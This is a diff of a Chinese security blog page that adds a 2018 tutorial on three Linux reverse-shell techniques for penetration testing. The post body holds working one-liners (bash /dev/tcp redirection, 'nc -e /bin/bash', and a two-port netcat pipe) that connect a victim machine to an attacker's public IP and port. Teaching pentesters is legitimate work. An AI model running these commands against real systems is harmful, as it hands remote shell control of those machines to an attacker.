@@ -158,24 +158,35 @@
 
 
 
-  <meta name="description" content="我不生产知识，我只是知识的搬运工。">
-<meta name="keywords" content="算法,安全,开发,博客,Java,Python,Vue,Angular,前端,Material">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Aries&#39; blog">
-<meta property="og:url" content="https://www.renhj.org/tags/安全/index.html">
+  <meta name="description" content="0x01 前言  在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？ 而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外">
+<meta name="keywords" content="安全,反弹shell,netcat,渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux反弹shell的三种方法">
+<meta property="og:url" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法.html">
 <meta property="og:site_name" content="Aries&#39; blog">
-<meta property="og:description" content="我不生产知识，我只是知识的搬运工。">
+<meta property="og:description" content="0x01 前言  在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？ 而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/1受害机反弹shell.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机获得shell.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/2受害机反弹shell.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/2攻击机获得shell.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机监听端口.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/3受害机反弹shell.jpg">
+<meta property="og:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机获得shell.jpg">
+<meta property="og:updated_time" content="2018-11-06T07:35:02.615Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Aries&#39; blog">
-<meta name="twitter:description" content="我不生产知识，我只是知识的搬运工。">
+<meta name="twitter:title" content="Linux反弹shell的三种方法">
+<meta name="twitter:description" content="0x01 前言  在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？ 而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外">
+<meta name="twitter:image" content="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg">
 
 
 
 
 
 
-  <link rel="canonical" href="https://www.renhj.org/tags/安全/"/>
+  <link rel="canonical" href="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法.html"/>
 
 
 
@@ -185,7 +196,7 @@
   };
 </script>
 
-  <title>标签: 安全 | Aries' blog</title>
+  <title>Linux反弹shell的三种方法 | Aries' blog</title>
   
 
 
@@ -250,7 +261,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -315,7 +326,7 @@
         
         
           
-          <li class="menu-item menu-item-tags menu-item-active">
+          <li class="menu-item menu-item-tags">
     <a href="/tags/" rel="section">
       <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
   </li>
@@ -411,93 +422,252 @@
           
             
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
           
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>安全<small>标签</small>
-        </h2>
-      </div>
+  
 
-      
-        
+  
+  
+  
+
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.renhj.org/posts/2018-11-06-Linux反弹shell的三种方法.html">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="无名万物">
+      <meta itemprop="description" content="我不生产知识，我只是知识的搬运工。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aries' blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/posts/2018-11-06-Linux反弹shell的三种方法.html" itemprop="url">
-              
-                <span itemprop="name">Linux反弹shell的三种方法</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">Linux反弹shell的三种方法
+              
+            
+          </h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-11-06T11:55:30+08:00"
-              content="2018-11-06" >
-          11-06
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
 
-    </header>
-  </article>
+            
+            
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
 
+              
+                
+              
+
+              <time title="创建时间：2018-11-06 11:55:30 / 修改时间：15:35:02" itemprop="dateCreated datePublished" datetime="2018-11-06T11:55:30+08:00">2018-11-06</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/安全/" itemprop="url" rel="index"><span itemprop="name">安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <div style="text-align: center;"><br><div class="note success"><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3></div><br></div>
+
+<p>在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？</p>
+<p>而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。</p>
+<div style="text-align: center;"><br><div class="note success"><h3 id="0x02-获取shell"><a href="#0x02-获取shell" class="headerlink" title="0x02 获取shell"></a>0x02 获取shell</h3></div><br></div>
+
+<p>通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。</p>
+<p>我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。</p>
+<h4 id="通过bash反弹shell"><a href="#通过bash反弹shell" class="headerlink" title="通过bash反弹shell"></a>通过bash反弹shell</h4><p>第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令<code>nc -lvvp 7777</code>,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令<code>bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1</code>。</p>
+<p><code>bash -i</code>的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。</p>
+<p>下面来看一下具体的效果，先在攻击机器上监听端口：</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg">
+<p>在受害机器上反弹shell：</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/1受害机反弹shell.jpg">
+<p>之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机获得shell.jpg">
+<h4 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h4><p>如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。</p>
+<p>同样，先在攻击机器上130.211.244.96开启监听端口<code>nc -lvvp 7777</code>，等待受害机器连接。</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/1攻击机监听端口.jpg">
+<p>在受害机器上执行命令<code>nc -e /bin/bash 130.211.244.96 7777</code>,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/2受害机反弹shell.jpg">
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/2攻击机获得shell.jpg">
+<h4 id="利用管道反弹shell"><a href="#利用管道反弹shell" class="headerlink" title="利用管道反弹shell"></a>利用管道反弹shell</h4><p>netcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。</p>
+<p>首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机监听端口.jpg">
+<p>然后在受害机器上执行命令<code>nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778</code>，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/3受害机反弹shell.jpg">
+<p>这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。</p>
+<img src="/posts/2018-11-06-Linux反弹shell的三种方法/3攻击机获得shell.jpg">
+<p><br></p>
+<p>当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。</p>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- 信息流广告 -->
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-4127326375481893" data-ad-slot="9105526840" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
       
     </div>
 
+    
+      
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a class="btn" href="/tags/安全/" rel="tag">
+             <i class="fa fa-tag"></i> 安全
+            </a>
+          
+            <a class="btn" href="/tags/反弹shell/" rel="tag">
+             <i class="fa fa-tag"></i> 反弹shell
+            </a>
+          
+            <a class="btn" href="/tags/netcat/" rel="tag">
+             <i class="fa fa-tag"></i> netcat
+            </a>
+          
+            <a class="btn" href="/tags/渗透测试/" rel="tag">
+             <i class="fa fa-tag"></i> 渗透测试
+            </a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/2018-11-02-微服务面试题.html" rel="next" title="微服务面试题">
+                <i class="fa fa-chevron-left"></i> 微服务面试题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -518,8 +688,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -690,6 +869,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-获取shell"><span class="nav-number">2.</span> <span class="nav-text">0x02 获取shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过bash反弹shell"><span class="nav-number">2.1.</span> <span class="nav-text">通过bash反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用netcat反弹shell"><span class="nav-number">2.2.</span> <span class="nav-text">利用netcat反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用管道反弹shell"><span class="nav-number">2.3.</span> <span class="nav-text">利用管道反弹shell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -862,6 +1057,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.2"></script>
+
+
 
   
 
